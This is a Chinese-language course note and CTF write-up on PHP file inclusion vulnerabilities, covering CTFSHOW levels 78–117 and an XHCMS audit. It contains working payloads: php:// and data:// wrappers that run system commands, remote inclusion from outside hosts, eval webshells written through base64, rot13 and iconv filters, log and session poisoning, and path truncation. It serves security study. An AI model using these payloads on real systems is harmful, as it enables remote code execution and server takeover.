![1646801287289-79bd4f4e-8e9b-4c76-9f49-c47784134bd7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103117631-953331238.png)

```plain
#知识点：
1、解释-什么是文件包含
2、分类-本地LFI&远程RFI
3、利用-配合上传&日志&会话（session）
4、利用-伪协议&编码&算法等

#核心知识：
1、本地包含LFI&远程包含RFI-区别
一个只能包含本地，一个可以远程加载
具体形成原因由代码和环境配置文件决定（远程条件决定）
2、各类脚本语言包含代码写法-见下文
<!--#include file="1.asp" -->
<!--#include file="top.aspx" -->
<c:import url="http://thief.one/1.jsp">
<jsp:include page="head.jsp"/>
<%@ include file="head.jsp"%>
<?php Include('test.php')?>
3、各类脚本语言包含伪协议玩法-见图
https://www.cnblogs.com/endust/p/11804767.html

#思路要点：
-黑盒发现：主要观察参数传递的数据和文件名是否对应
-白盒发现：
1、可通过应用功能追踪代码定位审计
2、可通过脚本特定函数搜索定位审计
3、可通过伪协议玩法绕过相关修复等

#本课总结：
1、有可控文件如能上传文件，配合上传后包含
2、无可控文件可以利用日志或Session&伪协议
3、代码固定目录及文件后缀时需考虑版本绕过
4、伪协议玩法是建立在代码中只有变量存在时
```

![1646801333646-5c74b829-b53b-4ea5-b1da-f48ee69bc5ad.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103130686-441653434.png)

![1646801354113-d9be0538-6353-47f9-a68c-9bcf89c8dd81.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103130013-1643472185.png)

- 前置知识-原理&分类&探针&利用&修复

```plain
什么是文件包含：简单来说引用文件，目的是代码共享。
1.txt:<?phpinfo();?>
test2.php:<?include('1.php');?>
访问test2.php，就能执行phpinfo()效果
http://127.0.0.1:8081/web/test2.php

实现过滤功能，是每个代码段进行过滤编写，还是写一个过滤文件
1.每个需要过滤的地方，进行一次过滤的编写。
2.每个需要过滤的地方，进行一次文件包含调用过滤函数。（实现代码共享）

包含这个文件，会对包含的文件进行代码执行，如果能控制，那就会形成漏洞
比如：
$file=$_GET['x'];x可控
include($file);

攻击思路：
1.配合文件上传进行getshell，图片带有脚本后门代码，包含这个图片，图片代码被触发
2.配合日志文件进行getshell，日志会记录访问UA信息，修改UA信息为后门代码，包含即执行后门代码
3.配合会话文件进行getshell

那么在黑盒中应该怎么判断呢？
黑盒发现：主要观察参数传递的数据和文件名是否对应
比如$file=$_GET['x'];//?x=index.php(文件名)
```

- CTF应用-CTFSHOW-78关卡到117关卡

78

```plain
代码：
if(isset($_GET['file'])){ 
    $file = $_GET['file']; 
    include($file); 
}else{ 
    highlight_file(__FILE__); 
}

payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php
payload: ?file=php://input post:<?php system('tac flag.php');?>
payload: ?file=http://www.mumuxi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

79

```plain
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}

过滤了file和php

payload: ?file=data://text/plain,<?=system('tac flag.*');?>
payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
远程文件包含：如果不支持，那就只能支持本地的。
条件：
allow_url_fopen:on
allow_url_include:on
在代码也有相关限制。
```

80，82

```plain
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
过滤了php,data
尝试http，也被禁用了。还有file协议，但是file，zip等协议是加绝对路径的。http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
php被过滤了，这个在路径上是不能用*号代替的。之前能用*号代替是因为他调用系统命令，比如system('tac flag.*')   路径上的文件名字如果flag.*，那么系统就会认为他是flag.*

那么他可以包含日志文件，信息收集中间件是Nginx
在网上查看Nginx的日志文件为/var/log/nginx/access.log

1、利用其他协议,如file,zlib等
2、利用日志记录UA特性包含执行
分析需文件名及带有php关键字放弃
故利用日志记录UA信息，UA带入代码
包含：/var/log/nginx/access.log
```

82-86

```plain
session包含，参考：
https://www.cnblogs.com/lnterpreter/p/14086164.html
https://www.cnblogs.com/echoDetected/p/13976405.html


在每个环境下面有个目录存储，在phpstudy中，存储session目录D:\phpstudy_pro\Extensions\tmp\tmp
这里有很多文件以sess_开头的文件名
```

![1646888048289-abda5aec-20ea-4c6e-a655-0f25b43dd7eb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103130122-1384828689.png)

```plain
这个文件是固定路径，如果知道了这个路径，那么就可以用包含session文件来实现getshell

文件包含

本地包含：LFI（local file include）
包含一个文件，这个文件有后门代码，就可以shell连上去
这个文件哪里来？
1.可以通过文件上传获取，上传的文件在服务器上面。
2.没有文件上传，借助日志写入（UA），session文件写入
3.伪协议没有文件上传也能进行PHP代码执行

那么session到底怎么样才能getshell呢？
在自己本地构造一个upload文件，后缀为html
<!DOCTYPE html>
<html>
<body>
<form action="http://127.0.0.1:8081/web/include.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form>
</body>
</html>
随便选一个文件进行上传，然后到存储session目录下观察session文件变化
```

![1646889274259-56f7d49a-8571-4b99-adfa-54808e37d234.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103130106-1113011801.png)

```plain
发现访问就会产生session文件，虽然说sess_头固定，但是后面是不固定的。
进行抓包，发现数据包中函数PHPSESSID的值，与sess_后面的值一直，修改PHPSESSID来进行控制sess_的文件名。
但是本地没有。

那么文件名应该怎么控制呢？通过表单PHP_SESSION_UPLOAD_PROGRESS来控制sess_文件内容，比如<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
这个提交的sess_内容是123
伪协议读写的条件：
php代码：
$file=$_GET['filename'];
include($file);

访问http://127.0.0.1:8081/web/include.php?filename=1.txt
这样就能包含成功。
访问http://127.0.0.1:8081/web/include.php?filename=php://filter/read=convert.base64-encode/resource=1.txt
这个就能读取到1.txt的内容

如果在代码中写上
$file=$_GET['filename'];
include(‘mysql/’.$file);
包含文件的时候，包含mysql这个目录下的文件
那么如果还要包含，那应该怎么办？
这样访问就可以http://127.0.0.1:8081/web/include.php?filename=../1.txt
但是这个伪协议不能使用。伪协议不管前面和后面有没有东西，只要有东西都不可以。
```

87

```plain
if(isset($_GET['file'])){ 
    $file = $_GET['file']; 
    $content = $_POST['content']; 
    $file = str_replace("php", "???", $file); 
    $file = str_replace("data", "???", $file); 
    $file = str_replace(":", "???", $file); 
    $file = str_replace(".", "???", $file); 
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content); 

     
}else{ 
    highlight_file(__FILE__); 
}


发现urldecode解码，
1、利用base64:
url编码2次：php://filter/write=convert.base64-decode/resource=123.php   浏览器自动解码和代码进行解码（两次解码）
  经过第一次编码%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%77%72%69%74%65%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%31%32%33%2E%70%68%70
URL会自动解码（浏览器），最后也变成了php://filter/write=convert.base64-decode/resource=123.php
然后在进行一次编码
%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30

content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
content用base64进行写的东西，所以传入的值也要编码
前面aa是填充值，为什么要加进去呢？因为base64编码默认是四个比特字节一次。
访问123.php，psot提交a=phpinfo();

2、利用凯撒13：
url编码2次：php://filter/write=string.rot13/resource=2.php 也要经过两次编码
content=<?cuc riny($_CBFG[1]);?>
访问2.php,post提交1=phpinfo();
```

88

```plain
if(isset($_GET['file'])){ 
    $file = $_GET['file']; 
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){ 
        die("error"); 
    } 
    include($file); 
}else{ 
    highlight_file(__FILE__); 
} 

过滤PHP，各种符号，php代码编码写出无符号base64值
Payload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk
PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk是base64编码写法，需要没有过滤的字符。解码为：<?php system('tac *.php');echo 123;?>ad
```

![1646894500468-56bd35fa-a67e-4cb8-915f-70747fd48d3b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103130249-2027901663.png)

117

```plain
highlight_file(__FILE__); 
error_reporting(0); 
function filter($x){ 
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){ 
        die('too young too simple sometimes naive!'); 
    } 
} 
$file=$_GET['file']; 
$contents=$_POST['contents']; 
filter($file); 
file_put_contents($file, "<?php die();?>".$contents); 


convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用
<?php
$result = iconv("UCS-2LE","UCS-2BE", '<?php eval($_POST[a]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
?>
Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
contents=?<hp pvela$(P_SO[T]a;)>?
```

- CMS源码-XHCMS-代码审计&日志&绕过

```plain
1、搜索特定函数寻包含点
2、固定目录及后缀名需绕过
3、由CMS无上传用日志包含
4、利用长度绕过后缀名固定

Payload：
?r=../../../Apache/logs/access.log/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
打开xhcms，搜索关键字include
```

![1646896060822-dc2e18e3-b329-43f1-b8cd-82dd2aff3ed4.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913103130565-989512384.png)

```plain
index.php代码：
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件
?>

前后有字符干扰，可以知道伪协议已经用不了了。
查看前端页面，也没有文件上传点。
所以利用日志或者session
找到日志文件D:\phpstudy_pro\Extensions\Apache2.4.39\logs\access.log


网站目录：
D:\phpstudy_pro\WWW\xhcms
D:\phpstudy_pro\Extensions\Apache2.4.39\logs\access.log


构造payload：127.0.0.1:8087/?r=../../Extensions/Apache2.4.39/logs/access.log/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```

